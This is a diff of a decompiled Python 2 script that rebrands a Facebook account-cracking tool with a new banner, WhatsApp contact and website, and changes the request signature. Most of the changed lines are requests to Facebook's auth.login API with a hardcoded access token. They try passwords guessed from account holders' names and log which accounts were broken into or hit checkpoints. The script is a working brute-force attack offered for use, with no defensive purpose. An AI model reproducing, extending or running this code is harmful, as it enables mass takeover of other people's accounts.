@@ -1,5 +1,5 @@
-# Decompile by Mardis (Tools By Kapten-Kaizo)
-# Time Succes decompile : 2022-03-12 17:47:35.910329
+# Decompile by Mardis (Tools By HA Skill)
+# Time Succes decompile : 2024-10-28
 import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -29,16 +29,16 @@ try:
 except:
     os.system('pip2 install lolcat')
 logo = """'\x1b[1;92m'
-           ____  ______ ______ _____            
-     /\   |  _ \|  ____|  ____|  __ \     /\    
-    /  \  | |_) | |__  | |__  | |__) |   /  \   
-   / /\ \ |  _ <|  __| |  __| |  _  /   / /\ \  
-  / ____ \| |_) | |____| |____| | \ \  / ____ \ 
- /_/    \_\____/|______|______|_|  \_\/_/    \_\                                                                                          
+  _    _             _____ _    _ _ _ 
+ | |  | |   /\      / ____| |  (_) | |
+ | |__| |  /  \    | (___ | | ___| | |
+ |  __  | / /\ \    \___ \| |/ / | | |
+ | |  | |/ ____ \   ____) |   <| | | |
+ |_|  |_/_/    \_\ |_____/|_|\_\_|_|_                                                                                        
 '\x1b[1;91m'====================================================
-'\x1b[1;92m'   Github      :     RIAZKHAN(ABEERA)  
-'\x1b[1;93m'   FB ID       :     SACH KAHON FB JA NAME NAHI
-'\x1b[1;94m'   TOOL TYPE   :     FREE COMMANDS
+'\x1b[1;92m'   YouTube     :     @haskill1  
+'\x1b[1;93m'   WhatsApp    :     +44 7477210784
+'\x1b[1;94m'   website     :     haskill.online
 '\x1b[1;91m'==================================================== 
 '\x1b[1;92m'_________TOOL BEST HAI SO SAHE SE USE KSR 
 '\x1b[1;93m'====================================================
@@ -95,7 +95,7 @@ def main_apv():
     print "\x1b[1;95m[6]   Update Tools"
     print "\x1b[1;96m[7]   For Any Help Massage WhatsApp"
     print 50*'~'
-    print "\x1b[1;92m[*] \x1b[1;95m For Need Any Help Type 7 And Massage Me On \x1b[1;92mWhatsApp "
+    print "\x1b[1;92m[*] \x1b[1;95m For Need Any Help WhatsApp +44 7477210784 "
     print 450*'~'
     main_input()
 def main_input():
@@ -162,7 +162,7 @@ def main_input():
 			
 			
     elif mx=='7':
-        os.system("xdg-open https://wa.me/+923188214452")
+        os.system("xdg-open https://wa.me/+44 7477210784")
         time.sleep(3)
         main_system()
         
@@ -2527,7 +2527,7 @@ def n_p_pass():
             last = name.rsplit(' ')[1]
             
             pass1 = name
-            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
             q = json.loads(data)
             if "access_token" in q:
                 print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass1
@@ -2546,7 +2546,7 @@ def n_p_pass():
                     cps.append(uid+pass1)
                 else:
                     pass2= first+ps1
-                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
                     q = json.loads(data)
                     if "access_token" in q:
                         print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass2
@@ -2563,7 +2563,7 @@ def n_p_pass():
                             cps.append(uid+pass2)
                         else:
                             pass3=  first+ps2
-                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
                             q = json.loads(data)
                             if "access_token" in q:
                                 print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass3
@@ -2580,7 +2580,7 @@ def n_p_pass():
                                     cps.append(uid+pass3)
                                 else:
                                     pass4= first+ps3
-                                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+                                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
                                     q = json.loads(data)
                                     if "access_token" in q:
                                         print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass4
@@ -2597,7 +2597,7 @@ def n_p_pass():
                                             cps.append(uid+pass4)
                                         else:
                                             pass5= last+ps4
-                                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+                                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
                                             q = json.loads(data)
                                             if "access_token" in q:
                                                 print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass5
@@ -2763,7 +2763,7 @@ def p_p_pass():
         name=name.lower()
         try:
             pass1 = ps1
-            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
             q = json.loads(data)
             if "access_token" in q:
                 print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass1
@@ -2782,7 +2782,7 @@ def p_p_pass():
                     cps.append(uid+pass1)
                 else:
                     pass2=ps2
-                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
                     q = json.loads(data)
                     if "access_token" in q:
                         print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass2
@@ -2799,7 +2799,7 @@ def p_p_pass():
                             cps.append(uid+pass2)
                         else:
                             pass3=ps3
-                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
                             q = json.loads(data)
                             if "access_token" in q:
                                 print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass3
@@ -2816,7 +2816,7 @@ def p_p_pass():
                                     cps.append(uid+pass3)
                                 else:
                                     pass4=ps4
-                                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+                                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=1MHor3LxowoWSBmQVTeCWM3uuET6SMa9pu', headers=header).text
                                     q = json.loads(data)
                                     if "access_token" in q:
                                         print "\x1b[1;92m[RIAZ-OK] "+uid + " | " + pass4
